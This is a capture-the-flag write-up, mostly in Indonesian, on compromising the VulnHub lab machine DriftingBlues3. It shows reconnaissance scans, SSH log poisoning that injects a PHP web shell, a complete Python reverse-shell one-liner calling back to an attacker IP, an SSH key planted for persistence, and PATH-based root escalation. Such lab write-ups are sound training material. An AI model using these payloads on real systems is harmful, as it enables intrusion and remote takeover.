---
title: 'Driftingblues3 - VULNHHUB'
date: 2024-05-02T18:03:03+07:00
draft: false
cover: 
    images: "![alt text](image.png)"
    alt: "<alt text>"
    caption: "<text>"
    relative: false # To use relative path for cover image, used in hugo Page-bundles
---
![image](/img/driftingblues/driftingblues3.png)

### **DISCLAIMER**
> Any actions and or activities related to the material contained within this Website is solely your responsibility. This site contains materials that can be potentially damaging or dangerous. If you do not fully understand something on this site, then GO OUT OF HERE! Refer to the laws in your province/country before accessing, using, or in any other way utilizing these materials.These materials are for educational and research purposes only.
----

### im play machine in virtualbox, so first steb for indentify machine is run the netdiscover 

`sudo netdiscover -i vboxnet0` 

```
 Currently scanning: 172.16.126.0/16   |   Screen View: Unique Hosts

 2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 84
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 192.168.56.100  08:00:27:10:2a:e9      1      42  PCS Systemtechnik GmbH
 192.168.56.118  08:00:27:ef:74:97      1      42  PCS Systemtechnik GmbH
```

ip `192.168.56.118` adalah korban, jadi untuk kedepan kita akan menyerang alamat ip tersebut, oke lets go!

setelah kita mengetahui alamat ip korban, langkah selanjutnya adalah melakukan portscanning yang bertujuan untuk melihat port mana saja yang terbuka dan memungkinkan untuk kita serang.

### NMAP
```
-> nmap -sCV -Pn 192.168.56.118 -o nmap.log 
Nmap scan report for 192.168.56.118
Host is up (0.0060s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 6a:fe:d6:17:23:cb:90:79:2b:b1:2d:37:53:97:46:58 (RSA)
|   256 5b:c4:68:d1:89:59:d7:48:b0:96:f3:11:87:1c:08:ac (ECDSA)
|_  256 61:39:66:88:1d:8f:f1:d0:40:61:1e:99:c5:1a:1f:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html).
| http-robots.txt: 1 disallowed entry
|_/eventadmins
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  
# Nmap done at Sat Apr 27 14:19:40 2024 -- 1 IP address (1 host up) scanned in 20.54 seconds
```
terlihat di atas ada dua port terbuka 22 dan 80. pertama kita fokus pada port 80.
setelah pemeriksaan pada web tidak ada yang menarik, yang mana hanya menampilkan sebuah poster event dan performance acara
![image](/img/driftingblues/port-80.png)
![image](/img/driftingblues/port-80-2.png)

karena pada tampilan web tidak ada yang menarik, jadi saya akan mencoba serangan bruteforce pada directory menggunakan tools gobuster.
### GOBUSTER
```
gobuster dir -u http://192.168.56.118 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.118
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/privacy              (Status: 301) [Size: 318] [--> http://192.168.56.118/privacy/]
/drupal               (Status: 301) [Size: 317] [--> http://192.168.56.118/drupal/]
/secret               (Status: 301) [Size: 317] [--> http://192.168.56.118/secret/]
/Makefile             (Status: 200) [Size: 11]
/wp-admin             (Status: 301) [Size: 319] [--> http://192.168.56.118/wp-admin/]
/phpmyadmin           (Status: 301) [Size: 321] [--> http://192.168.56.118/phpmyadmin/]
/server-status        (Status: 403) [Size: 279]
/robots.txt           (Status: 200) [Size: 37]
Progress: 220561 / 220562 (100.00%)
===============================================================
Finished
```

dari hasil gobuster terlihat kita menemukan bebebrapa direktori dan file menarik
![image](/img/driftingblues/robots-txt.png)
pada file robots.txt yang kita cek terdapat directory `/eventadmins` maka saya akan mengeceknya, apakah ada sesuatu disana.

pada direktory `eventadmins` kita diberitahu sebuah peringatan seperti ssh beracun, dan kita juga diberi tahu untuk mengecek file `/littlequeenofspades.html` juga.

yang saya lihat pada file `/littlequeenofspades.html` terlihat seperti sebuah lirik, akan tetapi ketika saya select semua teks seperti terdapat code yang tersembunyi.
![image](/img/driftingblues/little-quen.png)
![image](/img/driftingblues/little-quen-2.png)

jadi saya mencoba untuk melihat sourcode pada halaman tersebut dan ternyata benar ada code `base64` yang disembunyikan
![image](/img/driftingblues/ctrl-u.png)
 
setelah saya mengetahui code tersebut maka langkah selanjutnya adlah mengencode code tersebut seperti ini.

### ENCODE
```
-> echo "aW50cnVkZXI/IEwyRmtiV2x1YzJacGVHbDBMbkJvY0E9PQ==" | base64 -d
ntruder? L2FkbWluc2ZpeGl0LnBocA==
-> echo "L2FkbWluc2ZpeGl0LnBocA==" | base64 -d
adminsfixit.php
```
dari hasil encode kita mendapatkan output sebuah file `adminsfixit.php` yang perlu kita cek

![image](/img/driftingblues/ssh-log.png)
seperti yang terlihat pada file `adminsfixit.php`  terdapat sebuah log auth ssh yang memungkinkan untuk dieksploitasi. untuk cara exploitasi mungkin bisa menggunakan referensi [ini.](https://stackoverflow.com/questions/77948173/how-to-perform-ssh-log-poisoning-for-rce-with-lfi-using-php-system-call-in-usern) tetapi untuk kasus saya ini tidak berjalan dengan baik. jadi saya menggunakan cara lain seperti referensi [ini.](https://www.thehacker.recipes/web/inputs/file-inclusion/lfi-to-rce/logs-poisoning) kemudian saya menjalan kan command 

### CMD
```
-> nc 192.168.56.118 22
SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2
/<?php system($_GET['cmd']); ?>
Protocol mismatch.
```
setelah saya jalankan comaand itu lalu saya menoba mengujinya pada url dengan command `http://192.168.56.118/adminsfixit.php?cmd=ls` dapat dilihat saya berhasil menginputkan comand pada url

![image](/img/driftingblues/cmd.png) 

kemudian saya mencaoba untuk masuk sebagai shell, maka saya akan mencoba mengenerate shell menggunakan layanan sebuah web [ini.](https://www.revshells.com/), saya mencoba semua command `nc, php, bash` tetapi tidak ada yang berjalan selain python. commandnya adalah seperti yang dibawah ini, ubah alamat ip sesui milik kalian.

### REVERSHELL
```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

sebelum menjalankan command diatas jalan terlebih dahulu comand `netcat` agar terhubung dengan shell.
`nc -lvnp <PORT>`

### SHELL
![image](https://i.imgur.com/VqaHqjb.png)

dan terlihat sekarang kita terhubung sebagai shell `www-data`

kemudian saya coba lihat berapa user menggunakan command `ls /home` yang saya temukan hanya satu user saja.
![image](https://i.imgur.com/i8LE7uh.png)

lalu saya berpindah kedirectory `/home/robertj` dan menjalan perintah `ls -al` untuk melihat isi yang lebih detail, dan saya melihat ada file `user.txt` namum setelah saya coba liat outputnya tidak mendapatkan hak access. jadi saya mencoba untuk masuk kedirektory `.ssh` dan menjalankan perintah `ls -al` lagi untuk melihatnya namun saya tidak menemukan  apapun disana.
![image](https://i.imgur.com/h26z1zf.png)

### SSH-KEYGEN
jadi saya mencoba `ssh-keygen` pada machine local saya
![image](https://i.imgur.com/HRcVDTf.png)

disini kita dibuatkan dua file id_rsa private dan public. setelah itu saya transfer file `drift.pub` ke mesin korban mengunakan python seerver dengan perintah `python3 -m http.server` dengan port `8000`, kemudian saya ambil file pada mesin korban menggunakan `wget`.
![image](https://i.imgur.com/Hik4zp2.png)

kemudian ubah nama `drift.pub` menjadi `authorized_keys` dan jalankan command `chmod 600` pada untuk `drift` di mesin lokal untuk mendapatkan izin. lalu kita coba ssh mesin korban dengan command `ssh -i drift robertj@IP`dan yeah kita terkoneksi.
![image](https://i.imgur.com/8fG3Mr2.png)

saya banyak melakukan previlege-escalation akan tetapi saya menemukan sesuatu yang menarik untuk dilihat lebih dalam, ketika saya menjalankan perintah `find / -user root -perm /4000 2>/dev/null` ada perintah `/usr/bin/getinfo` yang kemungkinan rentan.
![image](https://i.imgur.com/nG1abjP.png)
![image](https://i.imgur.com/3BXMyfg.png)

seperti yang dapat dilihat kita mendapatkan informasi seprti `IP,hostname,os`

Untuk peningkatan hak istimewa ke ROOT, saya menggunakan metode penyalahgunaan $PATH. Anda dapat membaca detail tentang metode ini secara [detail](https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/)

untuk mendaptkan root saya melakukan command seperti dibawah
![image](https://i.imgur.com/x8eDQua.png)
![iamge](https://i.imgur.com/8ovbDHG.png)

terima kasih sudah membaca!

### keep hacking!


